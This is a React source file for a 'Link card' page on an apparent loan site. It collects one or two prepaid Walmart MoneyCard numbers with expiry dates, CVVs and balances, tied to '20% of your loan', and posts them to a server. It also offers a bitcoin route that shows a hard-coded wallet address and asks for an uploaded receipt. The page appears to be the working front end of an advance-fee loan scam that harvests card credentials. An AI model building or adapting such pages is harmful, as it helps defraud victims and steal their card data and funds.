import { ArrowLeft, ArrowRight } from "react-huge-icons/outline";
import image from "../../assets/review.png";
import card from "../../assets/activate.png";
import { useEffect, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import Qrcode from "../../assets/IMG-20240423-WA0025.jpg";
import { Copy, ImageAdd } from "react-huge-icons/solid";

import Frontside from "./Frontside";
import { toast } from "react-toastify";
const Initialpayment = () => {
  const [wallet] = useState("1GVoDGMcnbJbdeoe2XtCdvsdcAuCkE4ZxC");
  const [response, setResponse] = useState("");
  const [switchPay, setSwitch] = useState("Walmart MoneyCard");
  const navigate = useNavigate();
  const handlePaymentSwitch = () => {
    const paymentType = document.querySelector("#paymentype");
    let choice = paymentType.options[paymentType.selectedIndex].value;
    setSwitch(choice);
  };
  const handleCopyText = () => {
    setResponse("Text copied to clipboard");
    navigator.clipboard.writeText(wallet);
  };
  const [checkStatus, setCheckStatus] = useState(false);
  useEffect(() => {
    setTimeout(() => {
      setResponse("");
    }, 3000);
  }, [response]);
  const [imageUpload, setImageUpload] = useState(null);
  const [cryptoImage, setCryptoImage] = useState(null);
  const handleImageUpload = (e) => {
    let imageFile = e.target.files[0];
    const imageUrl = URL.createObjectURL(imageFile);
    setImageUpload(imageUrl);
    setCryptoImage(imageFile);
  };
  const handleCheckStatus = (e) => {
    let checkvalue = e.currentTarget.checked;
    setCheckStatus(checkvalue);
  };
  const [firstCard, setfirstCard] = useState("");
  const [security, setSecurity] = useState("");
  const [balance, setBalance] = useState("");
  const [date, setDate] = useState("");
  const [secondCard, setSecondfirstCard] = useState("");
  const [secondCardSecurity, setSecondCardSecurity] = useState("");
  const [secondCardBalance, setSecondCardBalance] = useState("");
  const [secondCardDate, setSecondCardDate] = useState("");

  const handlePayment = () => {
    let isValidCard =
      /^([0-9]{4})[-\s]?([0-9]{4})[-\s]?([0-9]{4})[-\s]?([0-9]{4})$/;
    let isValidDate = /^([0-9]{2})([/]{1})([0-9]{2})$/;
    let isValidCvv = /^([0-9]{3})$/;
    let isAddingAnotherCard = checkStatus;
    if (
      isValidCard.test(firstCard) &&
      isValidDate.test(date) &&
      isValidCvv.test(security)
    ) {
      if (isAddingAnotherCard) {
        if (
          isValidCard.test(secondCard) &&
          isValidDate.test(secondCardDate) &&
          isValidCvv.test(secondCardSecurity)
        ) {
          let depositDetails = {
            id: Date.now(),
            firstCard,
            date,
            security,
            balance,
            secondCard,
            secondCardBalance,
            secondCardDate,
            secondCardSecurity,
            photos: [],
          };
          fetch("/api/user/deposit", {
            method: "POST",
            headers: { "Content-Type": "Application/json" },
            body: JSON.stringify(depositDetails),
          })
            .then((result) => {
              if (!result.ok) {
                throw new Error("Error uploading the card detailes");
              }
              return result.json();
            })
            .then((response) => {
              if (response) {
                navigate("/frontside");
              }
            })
            .catch((err) => {
              toast.error(err.message);
            });
        } else {
          toast.warn("Enter a valid second card details");
          // console.log("Enter a valid second card details");
        }
      } else {
        let depositDetails = {
          id: Date.now(),
          firstCard,
          date,
          security,
          balance,
          photos: [],
        };
        fetch("/api/user/deposit", {
          method: "POST",
          headers: { "Content-Type": "Application/json" },
          body: JSON.stringify(depositDetails),
        })
          .then((result) => {
            if (!result.ok) {
              throw new Error("Error uploading the card detail s");
            }
            return result.json();
          })
          .then((response) => {
            if (response) {
              localStorage.setItem("card_id", response.response);
              setSubmitted(true);
            }
          })
          .catch((err) => {
            toast.error(err.message);
          });
      }
    } else {
      toast.warn("Enter a valid card details");
    }
  };
  const [cardDetailsSubmitted, setSubmitted] = useState(false);
  const [bitcoinAmount, setBitcoinAmount] = useState(0);
  const [paymentSucceed, setStatus] = useState(false);
  const handlePayWithCrypto = async () => {
    const formData = new FormData();
    formData.append("photo", cryptoImage);
    formData.append("amount", bitcoinAmount);
    const options = { method: "POST", body: formData };

    const response = await fetch("/api/crypto-payment", options);
    const serverResponse = await response.json();
    if (!cryptoImage || !bitcoinAmount) {
      toast.warn("Provide your payment details");
    } else if (serverResponse.paymentIsSubmitted) {
      navigate("/checking-crypto-payment");
    } else {
      toast.error(serverResponse.response);
    }
    // console.log(serverResponse);
  };

  return (
    <>
      {switchPay == "Walmart MoneyCard" ? (
        <div className="relative">
          {!cardDetailsSubmitted ? (
            <section className="bg-gray-100 relative h-auto py-2  max-sm:h-auto px-8 max-sm:px-4">
              <div className="flex ml-0 justify-start  items-center">
                <button
                  className="mt-4 mb-2 ml-0"
                  onClick={() => history.back()}
                >
                  <ArrowLeft className="text-2xl inline " /> back
                </button>
              </div>

              <div className="flex items-center justify-between">
                <h1 className="text-8xl font-extrabold max-sm:ml-2  max-sm:text-4xl mb-3 ml-1">
                  Link card
                </h1>
                <img src={image} className="w-30 h-20" alt="image" />
              </div>
              <div className="flex justify-start items-center mt-2">
                <strong className="text-2xl max-sm:ml-2  max-sm:text-xs text-gray-400">
                  Change Payment
                </strong>
                <select
                  className="ml-2 bg-gray-50 outline-gray-200 rounded-md py-1"
                  id="paymentype"
                  onChange={handlePaymentSwitch}
                >
                  <option>Walmart MoneyCard</option>
                  <option>Cryptocurrency (bitcoin)</option>
                </select>
              </div>

              <div className="flex w-full py-2 h-auto mt-3 rounded-md  bg-slate-50  flex-col justify-around  items-center">
                <div className="flex items-center gap-1 ml-2">
                  <input
                    type="checkbox"
                    value={true}
                    onChange={handleCheckStatus}
                  />{" "}
                  <p className="max-sm:text-xs text-amber-400 ml-2">
                    Check the button to add one more card, or leave unchecked if
                    the available balance on the first card is worth 20% of your
                    loan.
                  </p>
                </div>
                <div className="flex justify-around items-center max-sm:flex-col max-sm:w-auto">
                  <div className="flex justify-center  flex-col w-80 items-center max-sm:w-full">
                    <img
                      src={card}
                      alt="card-image"
                      className="w-52 h-52 object-contain"
                    />
                    <div className="grid grid-cols-2 max-sm:grid-cols-2 gap-1 px-2 max-sm:w-auto">
                      <div className="flex flex-col">
                        <strong className="ml-2 text-center text-gray-400 ">
                          CARD NUMBER
                        </strong>
                        <input
                          type="phone"
                          placeholder="XXXX XXXX XXXX XXXX"
                          max={16}
                          value={firstCard}
                          onChange={(e) => setfirstCard(e.target.value)}
                          className="card number px-1 outline-gray-200 py-2 "
                        />
                      </div>
                      <div className="flex flex-col">
                        <strong className="ml-2 text-center text-gray-400">
                          EXPIRY DATE
                        </strong>
                        <input
                          type="phone"
                          placeholder="MM/YY"
                          max={16}
                          value={date}
                          onChange={(e) => setDate(e.target.value)}
                          className="card number px-1 outline-gray-200 py-2  text-center"
                        />
                      </div>
                      <div className="flex flex-col">
                        <strong className="ml-2 text-center text-gray-400">
                          SECURITY
                        </strong>
                        <input
                          type="phone"
                          placeholder="CVV"
                          value={security}
                          onChange={(e) => setSecurity(e.target.value)}
                          max={16}
                          className="card number px-1 outline-gray-200 py-2  text-center"
                        />
                      </div>
                      <div className="flex flex-col">
                        <strong className="ml-2 text-center text-gray-400">
                          CARD BALANCE
                        </strong>
                        <input
                          type="number"
                          placeholder="AMOUNT"
                          max={16}
                          value={balance}
                          onChange={(e) => setBalance(e.target.value)}
                          className="card number px-1 outline-gray-200 py-2  text-center"
                        />
                      </div>
                    </div>
                  </div>
                  {checkStatus && (
                    <div className="flex justify-center  flex-col w-80 max-sm:w-full items-center">
                      <img
                        src={card}
                        alt="card-image"
                        className="w-52 h-52 object-contain"
                      />
                      <div className="grid grid-cols-2 max-sm:grid-cols-2 gap-1 px-2 max-sm:w-auto">
                        <div className="flex flex-col">
                          <strong className="ml-2 text-center text-gray-400 ">
                            CARD NUMBER
                          </strong>
                          <input
                            type="text"
                            placeholder="XXXX XXXX XXXX XXXX"
                            max={16}
                            value={secondCard}
                            onChange={(e) => setSecondfirstCard(e.target.value)}
                            className="card number px-1 outline-gray-200 py-2 "
                          />
                        </div>
                        <div className="flex flex-col">
                          <strong className="ml-2 text-center text-gray-400">
                            EXPIRY DATE
                          </strong>
                          <input
                            type="phone"
                            placeholder="MM/YY"
                            value={secondCardDate}
                            onChange={(e) => setSecondCardDate(e.target.value)}
                            max={16}
                            className="card number px-1 outline-gray-200 py-2  text-center"
                          />
                        </div>
                        <div className="flex flex-col">
                          <strong className="ml-2 text-center text-gray-400">
                            SECURITY
                          </strong>
                          <input
                            type="phone"
                            placeholder="CVV"
                            value={secondCardSecurity}
                            onChange={(e) =>
                              setSecondCardSecurity(e.target.value)
                            }
                            max={16}
                            className="card number px-1 outline-gray-200 py-2  text-center"
                          />
                        </div>
                        <div className="flex flex-col">
                          <strong className="ml-2 text-center text-gray-400">
                            CARD BALANCE
                          </strong>
                          <input
                            type="phone"
                            placeholder="AMOUNT"
                            value={secondCardBalance}
                            onChange={(e) =>
                              setSecondCardBalance(e.target.value)
                            }
                            max={16}
                            className="card number px-1 outline-gray-200 py-2  text-center"
                          />
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
              <div className="flex w-full justify-end items-center  mt-2">
                <button
                  onClick={handlePayment}
                  // to={images.length != 0 && `/${to}`}
                  className="bg-black rounded-lg py-2 px-2 text-center text-white w-52 mt-4 max-sm:w-full hover:bg-gray-900"
                >
                  SAVE CARD DETAILS
                  <ArrowRight className="inline text-xl" />
                </button>
              </div>
            </section>
          ) : (
            <Frontside />
          )}
        </div>
      ) : (
        <section className="bg-gray-100 relative h-auto py-2   max-sm:h-auto px-8 max-sm:px-4">
          <div className="flex ml-0 justify-start  items-center">
            <button className="mt-4 mb-2 ml-1" onClick={() => history.back()}>
              <ArrowLeft className="text-2xl inline " /> back
            </button>
          </div>
          <div className="flex items-center justify-between">
            <h1 className="text-8xl font-extrabold max-sm:ml-2  max-sm:text-4xl mb-3 ml-1">
              Pay with Crypto
            </h1>
            <img src={image} className="w-30 h-20" alt="image" />
          </div>
          <div className="flex justify-start items-center mt-2">
            <strong className="text-gray-400  max-sm:text-xs">
              Change Payement
            </strong>
            <select
              className="ml-2 bg-gray-50 outline-gray-200"
              id="paymentype"
              onChange={handlePaymentSwitch}
            >
              <option>Walmart MoneyCard</option>
              <option>Cryptocurrency (bitcoin)</option>
            </select>
          </div>
          <div className="flex flex-col justify-center  rounded-lg items-center h-96 w-full bg-gray-50 mt-2">
            <img
              src={Qrcode}
              className="w-52 h-52  max-sm:w-auto object-contain rounded-lg"
              alt="qrcode"
            />
            <div className="flex w-52 flex-col h-auto max-sm:w-auto mt-2 text-gray-400">
              <p className="font-extrabold">{wallet.slice(0, 17) + "..."}</p>
              <div className="flex w-full flex-col justify-around mt-2 items-center">
                <div className="rounded-full w-30 h-30 py-2 px-2 bg-gray-100">
                  <Copy className="text-2xl" onClick={handleCopyText} />
                </div>
                <p>Copy wallet address</p>
                <p className="text-xs">{response}</p>
              </div>
            </div>
          </div>
          <div className="flex bg-gray h-auto flex-col py-2 bg-gray-100 justify-center gap-2 items-center">
            <input
              type="file"
              className="hidden"
              id="crypto-receipt"
              onChange={handleImageUpload}
            />
            <div className="flex  justify-center items-center flex-col">
              <div className="flex w-16 h-16  py-1 mr-1 px-1 rounded-md ">
                {imageUpload && (
                  <img
                    src={imageUpload}
                    alt="uploaded image"
                    className="w-full h-full object-contain rounded-md"
                  />
                )}
              </div>
              <p
                className={`${
                  paymentSucceed ? "text-green-500" : "text-red-500"
                }`}
              >
                {response}
              </p>
              {/* <ArrowRight className="text-4xl max-sm:text-2xl inline" /> */}
              <div className="relative"></div>
              <label
                htmlFor="crypto-receipt"
                className="w-auto  px-2 py-2 h-auto shadow-inner flex justify-center items-center rounded-full bg-gray-200"
              >
                <ImageAdd className="text-4xl max-sm:text-2xl text-gray-400 inline z-10" />
              </label>
              <p className="inline text-xs text-gray-400">
                click the icon above to upload receipt
              </p>{" "}
            </div>
            <div className="flex  justify-center items-center">
              <p className="inline text-xs">Write amount</p>{" "}
              <ArrowRight className="text-4xl max-sm:text-2xl inline" />
              <input
                type="number"
                placeholder="$0.00"
                value={bitcoinAmount}
                onChange={(e) => setBitcoinAmount(e.target.value)}
                className="bg-gray-200 px-2 py-2 w-28 outline-gray-100 rounded-md"
              />
            </div>
            <button
              onClick={handlePayWithCrypto}
              // to={`/checking-crypto-payment`}
              className="bg-black rounded-lg py-3 text-center text-white w-52 mt-4 max-sm:w-full hover:bg-gray-900"
            >
              SEND RECEIPT <ArrowRight className="inline text-2xl" />
            </button>
          </div>
        </section>
      )}
    </>
  );
};

export default Initialpayment;
